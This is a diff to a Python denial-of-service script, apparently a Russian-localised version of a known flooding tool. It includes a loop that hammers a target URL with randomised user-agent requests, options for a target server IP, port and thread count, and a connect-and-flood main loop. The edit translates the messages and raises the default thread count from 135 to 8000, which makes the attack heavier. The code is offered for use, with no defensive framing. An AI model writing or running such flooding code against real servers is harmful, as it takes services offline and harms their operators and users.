@@ -90,7 +90,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94m Не отправлено...\033[0m")
+			print("\033[42m Не отправлено...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -143,7 +143,7 @@ def usage():
 
 	-s : Сервер ip
 	-p : Порт Дефолт 80
-	-t : По умолчанию 135 \033[0m''')
+	-t : По умолчанию 8000 \033[0m''')
 	sys.exit()
 
 
@@ -156,7 +156,7 @@ def get_parameters():
 	optp.add_option("-q","--Тихий", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--Сервер", dest="host",help="Атака на сервер ip -s ip")
 	optp.add_option("-p","--Порт",type="int",dest="port",help="-p 80 Дефолт 80")
-	optp.add_option("-t","--Турбо",type="int",dest="turbo",help="Дефолт 135 -t 135")
+	optp.add_option("-t","--Турбо",type="int",dest="turbo",help="Дефолт 8000 -t 8000")
 	optp.add_option("-h","--Помощь",dest="help",action='store_true',help="Помощь тебе")
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
@@ -171,7 +171,7 @@ def get_parameters():
 	else:
 		port = opts.port
 	if opts.turbo is None:
-		thr = 135
+		thr = 8000
 	else:
 		thr = opts.turbo
 
@@ -190,8 +190,8 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait...\033[0m")
+	print("\033[92m",host," Порт: ",str(port)," Турбо: ",str(thr),"\033[0m")
+	print("\033[94m Пожалуйста, подождите...\033[0m")
 	user_agent()
 	my_bots()
 	time.sleep(5)
@@ -200,7 +200,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
+		print("\033[91m Проверьте домен и порт сервера\033[0m")
 		usage()
 	while True:
 		for i in range(int(thr)):
